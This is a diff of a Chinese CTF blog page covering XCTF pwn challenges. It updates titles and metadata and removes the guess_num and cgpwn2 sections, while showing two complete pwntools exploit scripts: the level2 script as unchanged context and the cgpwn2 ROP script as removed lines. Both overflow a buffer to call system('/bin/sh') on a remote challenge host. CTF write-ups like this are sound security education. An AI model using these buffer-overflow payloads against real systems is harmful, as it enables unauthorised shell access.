@@ -86,7 +86,7 @@
 <meta name="description" content="前言随缘更新，但是做了就更新（应该）">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界自闭之路">
+<meta property="og:title" content="攻防世界自闭之路&lt;一&gt;">
 <meta property="og:url" content="http://yoursite.com/2019/08/19/攻防世界刷题笔记/index.html">
 <meta property="og:site_name" content="chessman">
 <meta property="og:description" content="前言随缘更新，但是做了就更新（应该）">
@@ -110,12 +110,9 @@
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUOvRA.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUX9qf.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUOB2n.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3OUQe.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3XrnJ.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3XHAI.png">
-<meta property="og:updated_time" content="2019-08-20T16:00:00.000Z">
+<meta property="og:updated_time" content="2019-08-22T16:00:00.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻防世界自闭之路">
+<meta name="twitter:title" content="攻防世界自闭之路&lt;一&gt;">
 <meta name="twitter:description" content="前言随缘更新，但是做了就更新（应该）">
 <meta name="twitter:image" content="https://s2.ax1x.com/2019/08/21/mNUMX4.png">
 
@@ -153,7 +150,7 @@
 
 
 
-  <title>攻防世界自闭之路 | chessman</title>
+  <title>攻防世界自闭之路<一> | chessman</一></title>
   
 
 
@@ -297,15 +294,11 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">攻防世界自闭之路</h1>
+          <h1 class="post-title" itemprop="name headline">攻防世界自闭之路<一></一></h1>
         
 
         <div class="post-meta">
            
-            <i class="fa fa-thumb-tack"></i>
-            <font color="7D26CD">置顶</font>
-            <span class="post-meta-divider">|</span>
-          
           <span class="post-time">
 		  
               <span class="post-meta-item-icon">
@@ -330,8 +323,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-21T00:00:00+08:00">
-                2019-08-21
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-23T00:00:00+08:00">
+                2019-08-23
               </time>
             
           </span>
@@ -358,7 +351,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,036 字
+                  868 字
                 </span>
               
 
@@ -456,17 +449,7 @@
 <p>但是/bin/sh和system不是一起的。所以需要构造system(“/bin/sh”)的值。所以得到payload</p>
 <p><code>payload = 0x88填充buf + 0x4填充EBP + system()函数地址覆盖EIP + 0x0任意返回地址 + ‘/bin/sh’字符串地址</code></p>
 <h2 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">tp = remote(<span class="string">'111.198.29.45'</span>,<span class="number">47512</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x0804A024</span></span><br><span class="line">buf = <span class="number">0x88</span> + <span class="number">0x04</span></span><br><span class="line">sys_addr = <span class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line">payload =  buf *<span class="string">'A'</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(shell_addr)</span><br><span class="line"></span><br><span class="line">tp.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">tp.send(payload)</span><br><span class="line">tp.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h1><blockquote>
-</blockquote>
-<h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><blockquote>
-<p>ROP绕过nx</p>
-</blockquote>
-<h2 id="查看开启的保护-4"><a href="#查看开启的保护-4" class="headerlink" title="查看开启的保护"></a>查看开启的保护</h2><p>程序没有/bin/sh,通过name写入/bin/sh的位置。<br>/bin/sh的地址就为name的地址<br><img src="https://s2.ax1x.com/2019/08/19/m3OUQe.png" alt></p>
-<p>NX是打开的，所以不能利用栈，</p>
-<h2 id="查看程序伪代码"><a href="#查看程序伪代码" class="headerlink" title="查看程序伪代码"></a>查看程序伪代码</h2><p><img src="https://s2.ax1x.com/2019/08/19/m3XrnJ.png" alt></p>
-<p>能够利用的gets为name和s两个值。通过<br><img src="https://s2.ax1x.com/2019/08/19/m3XHAI.png" alt></p>
-<p>可知s的偏移地址为0x26<br>由此可得<code>payload = 0x26位填充s变量 + 0x4位覆盖EBP + system()函数地址 + 0x4位任意返回地址 + name常量地址</code>写出exp</p>
-<h2 id="完整的exp脚本为"><a href="#完整的exp脚本为" class="headerlink" title="完整的exp脚本为"></a>完整的exp脚本为</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">"111.198.29.45"</span>,<span class="number">46049</span>)</span><br><span class="line"></span><br><span class="line">shadd = <span class="number">0x0804A080</span></span><br><span class="line">sys = <span class="number">0x08048420</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x26</span>*<span class="string">'a'</span>+<span class="number">0x04</span>*<span class="string">'a'</span>+p32(sys)+<span class="string">'a'</span>*<span class="number">0x04</span>+p32(shadd)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"\n"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"\n"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
       
     </div>
     
@@ -583,7 +566,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -651,7 +634,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cgfsd"><span class="nav-number">2.</span> <span class="nav-text">cgfsd</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启了什么保护"><span class="nav-number">2.1.</span> <span class="nav-text">查看开启了什么保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码"><span class="nav-number">2.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp"><span class="nav-number">2.3.</span> <span class="nav-text">完整的exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#when-did-you-born"><span class="nav-number">3.</span> <span class="nav-text">when_did_you_born</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护"><span class="nav-number">3.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看"><span class="nav-number">3.2.</span> <span class="nav-text">ida查看</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">3.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hello-pwn"><span class="nav-number">4.</span> <span class="nav-text">hello_pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-1"><span class="nav-number">4.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-1"><span class="nav-number">4.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-1"><span class="nav-number">4.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level0"><span class="nav-number">5.</span> <span class="nav-text">level0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-2"><span class="nav-number">5.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-2"><span class="nav-number">5.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp-1"><span class="nav-number">5.3.</span> <span class="nav-text">完整的exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level2"><span class="nav-number">6.</span> <span class="nav-text">level2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-3"><span class="nav-number">6.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-3"><span class="nav-number">6.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-2"><span class="nav-number">6.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#guess-num"><span class="nav-number">7.</span> <span class="nav-text">guess_num</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cgpwn2"><span class="nav-number">8.</span> <span class="nav-text">cgpwn2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-4"><span class="nav-number">8.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看程序伪代码"><span class="nav-number">8.2.</span> <span class="nav-text">查看程序伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp脚本为"><span class="nav-number">8.3.</span> <span class="nav-text">完整的exp脚本为</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cgfsd"><span class="nav-number">2.</span> <span class="nav-text">cgfsd</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启了什么保护"><span class="nav-number">2.1.</span> <span class="nav-text">查看开启了什么保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码"><span class="nav-number">2.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp"><span class="nav-number">2.3.</span> <span class="nav-text">完整的exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#when-did-you-born"><span class="nav-number">3.</span> <span class="nav-text">when_did_you_born</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护"><span class="nav-number">3.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看"><span class="nav-number">3.2.</span> <span class="nav-text">ida查看</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">3.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hello-pwn"><span class="nav-number">4.</span> <span class="nav-text">hello_pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-1"><span class="nav-number">4.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-1"><span class="nav-number">4.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-1"><span class="nav-number">4.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level0"><span class="nav-number">5.</span> <span class="nav-text">level0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-2"><span class="nav-number">5.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-2"><span class="nav-number">5.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp-1"><span class="nav-number">5.3.</span> <span class="nav-text">完整的exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level2"><span class="nav-number">6.</span> <span class="nav-text">level2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-3"><span class="nav-number">6.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-3"><span class="nav-number">6.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-2"><span class="nav-number">6.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -685,7 +668,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">2.9k</span>
+    <span title="Site words total count">3.8k</span>
   
 </div>
 
